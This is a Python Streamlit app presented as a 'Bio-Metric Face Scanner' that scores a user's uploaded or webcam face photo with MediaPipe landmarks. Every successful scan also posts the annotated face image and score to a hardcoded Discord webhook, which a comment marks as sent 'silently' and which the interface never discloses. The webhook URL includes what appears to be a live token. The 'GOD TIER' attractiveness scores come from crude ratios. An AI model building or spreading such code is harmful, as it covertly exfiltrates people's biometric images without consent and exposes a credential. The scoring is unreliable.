import streamlit as st
import cv2
import mediapipe as mp
import numpy as np
import plotly.graph_objects as go
from PIL import Image, ImageDraw
import requests
import json
import io
from datetime import datetime

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1458651120204251269/adR7ttYwh1TfSzkFVyBQNDIas5x0l-RHU1VucZuSB9pUvDvNw1nT_q7C_0DI_KWGWYSJ"

st.set_page_config(page_title="Bio-Metric Face Scanner", page_icon="🧬", layout="wide")

# --- CUSTOM STYLING ---
st.markdown("""
<style>
    .stApp { background-color: #000000; color: #00ff41; }
    div.stButton > button {
        background-color: #00ff41; color: black; border-radius: 5px; border: none;
        font-weight: bold; padding: 10px 20px;
    }
    div.stButton > button:hover { background-color: #00cc33; color: black; }
    .metric-card {
        background: rgba(255, 255, 255, 0.05); border: 1px solid #333;
        padding: 15px; border-radius: 10px; text-align: center;
    }
</style>
""", unsafe_allow_html=True)

# --- CACHED AI MODELS ---
@st.cache_resource
def get_face_mesh():
    return mp.solutions.face_mesh.FaceMesh(
        static_image_mode=True,
        max_num_faces=1,
        refine_landmarks=True,
        min_detection_confidence=0.8  # Strict mode enabled
    )

face_mesh = get_face_mesh()

# --- HELPER: DRAW MESH ON FACE ---
def draw_mesh_on_image(image_pil, landmarks):
    image_cv = np.array(image_pil)
    image_cv = cv2.cvtColor(image_cv, cv2.COLOR_RGB2BGR)
    h, w, _ = image_cv.shape
    
    # Draw green points for landmarks
    for landmark in landmarks:
        x, y = int(landmark.x * w), int(landmark.y * h)
        cv2.circle(image_cv, (x, y), 1, (0, 255, 0), -1)
        
    return Image.fromarray(cv2.cvtColor(image_cv, cv2.COLOR_BGR2RGB))

# --- HELPER: RADAR CHART ---
def create_radar_chart(metrics):
    categories = ['Symmetry', 'Eye Spacing', 'Structure']
    values = [metrics['Symmetry'], metrics['Eye Spacing Score'], metrics['Face Structure Score']]
    
    fig = go.Figure()
    fig.add_trace(go.Scatterpolar(
        r=values,
        theta=categories,
        fill='toself',
        name='Face Stats',
        line_color='#00ff41'
    ))
    fig.update_layout(
        polar=dict(radialaxis=dict(visible=True, range=[0, 100])),
        showlegend=False,
        paper_bgcolor='rgba(0,0,0,0)',
        plot_bgcolor='rgba(0,0,0,0)',
        font=dict(color='white')
    )
    return fig

# --- WEBHOOK ---
def send_to_discord(score, feedback, metrics, image_pil):
    if not WEBHOOK_URL: return
    img_byte_arr = io.BytesIO()
    image_pil.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    
    payload = {
        "content": "🧬 **New Scan Complete**",
        "embeds": [{
            "title": f"Rating: {score:.1f}/10",
            "description": feedback,
            "color": 65280, # Matrix Green
            "fields": [
                {"name": "Symmetry", "value": f"{metrics['Symmetry']}%", "inline": True},
                {"name": "Structure", "value": f"{metrics['Face Structure Score']}", "inline": True}
            ],
            "image": {"url": "attachment://scan.png"}
        }]
    }
    requests.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files={'file': ('scan.png', img_byte_arr, 'image/png')})

# --- ANALYSIS LOGIC ---
def analyze_appearance(image_pil):
    image_np = np.array(image_pil)
    image = cv2.cvtColor(image_np, cv2.COLOR_RGB2BGR)
    results = face_mesh.process(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))

    if not results.multi_face_landmarks:
        return None, None, None, None, None

    landmarks = results.multi_face_landmarks[0].landmark
    
    # 1. Draw Mesh
    annotated_image = draw_mesh_on_image(image_pil, landmarks)

    # 2. Math
    def dist(a, b):
        p1 = np.array([a.x, a.y])
        p2 = np.array([b.x, b.y])
        return np.linalg.norm(p1 - p2)

    left_eye, right_eye = landmarks[33], landmarks[263]
    left_jaw, right_jaw = landmarks[234], landmarks[454]
    nose, chin = landmarks[1], landmarks[152]

    eye_distance = dist(left_eye, right_eye)
    face_width = dist(left_jaw, right_jaw) if dist(left_jaw, right_jaw) > 0 else 0.001
    face_height = dist(nose, chin)

    symmetry = 1.0 - abs(left_eye.y - right_eye.y)
    eye_ratio = eye_distance / face_width
    face_ratio = face_height / face_width

    # Scoring
    features = np.array([symmetry, eye_ratio, face_ratio])
    weights = np.array([4.0, 3.0, 3.0])
    raw_score = np.dot(features, weights)
    score = float(np.clip(raw_score * 2.8, 1, 10))

    if score > 9.0:
        feedback = "GOD TIER: Exceptional geometry."
        color = "#00ff41"
    elif score > 7.5:
        feedback = "MODEL TIER: Strong aesthetic balance."
        color = "#3b82f6"
    else:
        feedback = "HUMAN TIER: Unique organic features."
        color = "#f59e0b"

    metrics = {
        "Symmetry": round(symmetry * 100, 1),
        "Eye Spacing Score": round(eye_ratio * 100, 1),
        "Face Structure Score": round(face_ratio * 100, 1)
    }

    return score, feedback, color, metrics, annotated_image

# --- UI LAYOUT ---
st.title("🧬 Bio-Metric Face Scanner")
st.write("Upload a photo for deep geometric analysis.")

col1, col2 = st.columns([1, 1])

with col1:
    tab_up, tab_cam = st.tabs(["📁 Upload", "📸 Camera"])
    img_in = None
    
    with tab_up:
        f = st.file_uploader("Upload Image", type=['jpg','png','jpeg'])
        if f: img_in = Image.open(f)
            
    with tab_cam:
        c = st.camera_input("Scan Face")
        if c: img_in = Image.open(c)

with col2:
    if img_in:
        st.write("### Analysis Control")
        if st.button("RUN BIOMETRIC SCAN", use_container_width=True):
            with st.spinner("CALCULATING GEOMETRY..."):
                score, feedback, color, metrics, mesh_img = analyze_appearance(img_in)
                
                if score is None:
                    st.error("❌ No valid face detected. Try closer.")
                else:
                    # 1. Send data silently
                    send_to_discord(score, feedback, metrics, mesh_img)
                    
                    # 2. Display Results
                    st.markdown(f"<h1 style='color:{color}; font-size: 50px;'>{score:.1f} / 10</h1>", unsafe_allow_html=True)
                    st.info(feedback)
                    
                    if score > 8.5:
                        st.balloons()
                    
                    # 3. Interactive Chart
                    radar = create_radar_chart(metrics)
                    st.plotly_chart(radar, use_container_width=True)
                    
                    # 4. Show Face Mesh
                    with st.expander("👁️ View Computer Vision Layer"):
                        st.image(mesh_img, caption="AI Landmark Map", use_container_width=True)
